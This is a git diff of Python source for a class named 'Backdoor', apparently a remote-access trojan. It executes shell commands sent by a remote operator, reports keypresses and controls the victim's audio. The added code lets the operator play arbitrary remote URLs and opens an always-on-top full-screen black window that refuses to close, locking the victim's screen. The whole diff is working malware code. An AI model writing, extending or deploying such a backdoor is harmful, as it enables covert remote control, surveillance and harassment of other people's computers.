@@ -1,13 +1,42 @@
 import socket, json, subprocess, os, cv2, pyautogui
 import base64, threading, time, webbrowser
-import keyboard
+import keyboard, sys
+import multiprocessing
 
 from playsound import playsound
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
+from PyQt5.QtCore import *
+from PyQt5.QtGui import *
+from PyQt5.QtWidgets import *
+
 pyautogui.FAILSAFE = False
+
+class Window(QMainWindow):
+	def __init__(self):
+		super().__init__()
+		
+		self.setWindowFlags(Qt.WindowStaysOnTopHint)
+
+		self.setObjectName("Window")
+		self.setStyleSheet("#Window { background-color: black; }")
+
+		cursor = QCursor()
+		cursor.setPos(0, 0)
+
+
+	def closeEvent(self, event):
+		# print("alright")
+		# close = QMessageBox.question(self,
+		# 							 "QUIT",
+		# 							 "Are you sure want to stop process?",
+		# 							 QMessageBox.Yes | QMessageBox.No)
+		# if close == QMessageBox.Yes:
+		# 	event.accept()
+		# else:
+		event.ignore()
 
 
 def writer(data):
@@ -132,10 +161,18 @@ class Backdoor:
 		os.system(command)
 
 
-	def play_music(self):
+	def play_music(self, music):
 		self.music_playing = True
-		playsound("https://mp3bit.cc/5094.mp3")
+		playsound(music)
 		self.music_playing = False
+
+
+	def show_window(self):
+		self.app = QApplication([])
+		self.application = Window()
+
+		self.application.showFullScreen()
+		self.app.exec()
 
 
 	def run(self):
@@ -223,14 +260,16 @@ class Backdoor:
 					else:
 						self.reliable_send("[-] No key is pressed yet")
 
-				elif command == "play music":
+				elif command.startswith("play music"):
 					if not self.music_playing:
-						self.music_thread = threading.Thread(target=self.play_music)
+						link = "https://mp3bit.cc/5094.mp3"
+						if len(command.split()) > 2:
+							link = command.replace("play music", "").strip()
+						self.music_thread = threading.Thread(target=self.play_music, args=(link,))
 						self.music_thread.start()
 						self.reliable_send("[+] Music is playing")
 					else:
 						self.reliable_send("[~] You have to wait for end current music")
-
 
 				elif command.split()[0] == "volume":
 					try:
@@ -247,6 +286,16 @@ class Backdoor:
 					command = command.replace("async", "").strip()
 					res = self.execute_async(command)
 					self.reliable_send(res)
+
+				elif command == "window":
+					self.window_thread = multiprocessing.Process(target=self.show_window)
+					self.window_thread.start()
+					self.reliable_send("alright")
+					
+				elif command == "close window":
+					self.window_thread.terminate()
+					self.reliable_send("alright")
+					
 
 				else:
 					res = self.execute_system_command(command)
